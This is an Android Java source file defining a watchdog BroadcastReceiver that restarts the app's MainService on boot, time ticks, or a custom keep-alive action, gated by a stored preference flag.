package com.fason.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

import com.fason.app.service.MainService;

// Watchdog to keep service alive
public class WatchdogReceiver extends BroadcastReceiver {

    private static final String PREFS = "fason_prefs";
    private static final String KEY = "service_active";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();
        if (action == null) return;

        // Restart service if needed
        if ("keepAlive".equals(action) ||
            Intent.ACTION_TIME_TICK.equals(action) ||
            Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            ensureRunning(context);
        }
    }

    // Ensure service is running
    private void ensureRunning(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        boolean shouldRun = prefs.getBoolean(KEY, true);

        if (shouldRun) {
            try {
                Intent i = new Intent(ctx, MainService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i);
                } else {
                    ctx.startService(i);
                }
            } catch (Exception ignored) {}
        }
    }

    // Set service active state
    public static void setServiceActive(Context ctx, boolean active) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        prefs.edit().putBoolean(KEY, active).apply();
    }

    // Check if service should be active
    public static boolean isActive(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        return prefs.getBoolean(KEY, true);
    }
}
